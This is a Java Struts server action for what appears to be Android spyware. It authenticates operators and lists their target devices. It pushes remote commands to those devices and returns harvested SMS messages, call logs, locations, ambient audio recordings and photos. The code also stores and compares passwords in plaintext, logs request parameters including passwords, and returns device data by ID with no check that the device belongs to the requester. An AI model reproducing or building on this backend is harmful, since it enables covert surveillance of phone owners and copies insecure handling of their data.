package com.android.smsserver;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.apache.log4j.Logger;

import com.android.db.SqlUtil;
import com.android.page.Page;
import com.android.push.PushClient;
import com.opensymphony.xwork2.ActionSupport;

public class ServerAction extends ActionSupport {

	private static Logger log=Logger.getLogger(ServerAction.class);
	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;
	private Page page = new Page();
	private List<String> array = new ArrayList<String>();
	private Map<String, Object> map = new HashMap<String, Object>();
	private Map<String, String> mapparam = new HashMap<String, String>();
	private List<Map<String, Object>> lmo = new ArrayList<Map<String, Object>>();


	/**
	 * 用户登录认证
	 * 
	 * @return
	 */
	public String ServerLogin() {
		log.info("用户登录认证");
		log.info(mapparam);
		String sql = "select * from user where name=?";
		Map<String, Object> mo = SqlUtil.searchMap(sql,
				new Object[] { mapparam.get("name") });
		if (mo.isEmpty()) {
			map.put("state", 0);
			map.put("msg", "账号不存在");
		} else if (!mapparam.get("pass").equals(mo.get("pass").toString())) {
			map.put("state", 0);
			map.put("msg", "密码错误");
		} else {
			map.put("state", 1);
			map.put("id", mo.get("id"));
		}
		return "mapjson";
	}

	/**
	 * 用户pushserverid更新
	 * 
	 * @return
	 */
	public String UpdateServerId() {
		log.info("用户pushserverid更新");
		log.info(mapparam);
		String sql = "update user set serverid=? where id=?";
		int i = SqlUtil.update(sql, new Object[] { mapparam.get("serverid"),
				mapparam.get("id") });
		if (i > 0) {
			map.put("state", 1);
		} else {
			map.put("state", 0);
		}
		return "mapjson";
	}

	/**
	 * 获取用户Client列表
	 * 
	 * @return
	 */
	public String GetClientList() {
		log.info("获取用户Client列表");
		log.info(mapparam);
		String sql = "select * from devices where userid=?";
		List<Map<String, Object>> lmo = SqlUtil.search(sql,
				new Object[] { mapparam.get("userid") });
		map.put("data", lmo);
		return "mapjson";
	}

	/**
	 * 发送消息到client
	 * 
	 * @return
	 */
	public String sendToClient() {
		log.info("发送消息到client");
		log.info(mapparam);
		boolean flag = PushClient.SendMessage(mapparam.get("clientid"),
				mapparam.get("action"));
		if (flag) {
			map.put("state", 1);
		} else {
			map.put("state", 0);
		}
		return "mapjson";
	}
	/**
	 * 修改客户端信息
	 * 
	 * @return
	 */
	public String UpdateDeviceBase() {
		log.info("修改客户端信息");
		log.info(mapparam);
		String id = mapparam.get("id");
		String clientname = mapparam.get("name");
		String phone = mapparam.get("phone");
		String sql = "update devices set clientname=?,phone=? where id=?";
		int i = SqlUtil.save(sql, new Object[] { clientname, phone, id });
		if (i > 0) {
			map.put("state", 1);
			map.put("msg", "修改成功");
		} else {
			map.put("state", 0);
			map.put("msg", "修改失敗");
		}

		return "mapjson";
	}
	/**
	 * 获取短信列表
	 * 
	 * @return
	 */
	public String DeviceSmsList() {
		log.info("获取短信列表");
		log.info(mapparam);
		String sql = "SELECT * from devicesms where deviceid=?";
		
		page.setTsize(SqlUtil.searchCount(sql,new Object[]{mapparam.get("deviceid")}));
		page.setIsasc(false);
		lmo.addAll(SqlUtil.search(sql, new Object[]{mapparam.get("deviceid")},page));
		map.put("data", lmo);
		map.put("page", page);
		return "mapjson";
	}
	/**
	 * 获取通话列表
	 * 
	 * @return
	 */
	public String DeviceCallList() {
		log.info("获取通话列表");
		log.info(mapparam);
		String sql = "SELECT * from devicephone where deviceid=?";
		
		page.setTsize(SqlUtil.searchCount(sql,new Object[]{mapparam.get("deviceid")}));
		page.setIsasc(false);
		lmo.addAll(SqlUtil.search(sql, new Object[]{mapparam.get("deviceid")},page));
		map.put("data", lmo);
		map.put("page", page);
		return "mapjson";
	}
	/**
	 * 获取位置
	 * 
	 * @return
	 */
	public String DeviceLocList() {
		log.info("获取位置");
		log.info(mapparam);
		String sql = "SELECT * from devicelocation where deviceid=?";
		
		page.setTsize(SqlUtil.searchCount(sql,new Object[]{mapparam.get("deviceid")}));
		page.setIsasc(false);
		lmo.addAll(SqlUtil.search(sql, new Object[]{mapparam.get("deviceid")},page));
		map.put("data", lmo);
		map.put("page", page);
		return "mapjson";
	}
	/**
	 * 获取位置
	 * 
	 * @return
	 */
	public String DeviceRecordList() {
		log.info("获取环境录音");
		log.info(mapparam);
		String sql = "SELECT * from devicesound where deviceid=?";
		
		page.setTsize(SqlUtil.searchCount(sql,new Object[]{mapparam.get("deviceid")}));
		page.setIsasc(false);
		lmo.addAll(SqlUtil.search(sql, new Object[]{mapparam.get("deviceid")},page));
		map.put("data", lmo);
		map.put("page", page);
		return "mapjson";
	}
	/**
	 * 获取照片
	 * 
	 * @return
	 */
	public String DevicePhotoList() {
		log.info("获取环境录音");
		log.info(mapparam);
		String sql = "SELECT * from devicephoto where deviceid=?";
		
		page.setTsize(SqlUtil.searchCount(sql,new Object[]{mapparam.get("deviceid")}));
		page.setIsasc(false);
		lmo.addAll(SqlUtil.search(sql, new Object[]{mapparam.get("deviceid")},page));
		map.put("data", lmo);
		map.put("page", page);
		return "mapjson";
	}

	public Map<String, Object> getMap() {
		log.info(map);
		return map;
	}

	public void setMap(Map<String, Object> map) {
		this.map = map;
	}

	public List<Map<String, Object>> getLmo() {
		return lmo;
	}

	public void setLmo(List<Map<String, Object>> lmo) {
		this.lmo = lmo;
	}

	public Page getPage() {
		return page;
	}

	public void setPage(Page page) {
		this.page = page;
	}

	public Map<String, String> getMapparam() {
		return mapparam;
	}

	public void setMapparam(Map<String, String> mapparam) {
		this.mapparam = mapparam;
	}

	

}
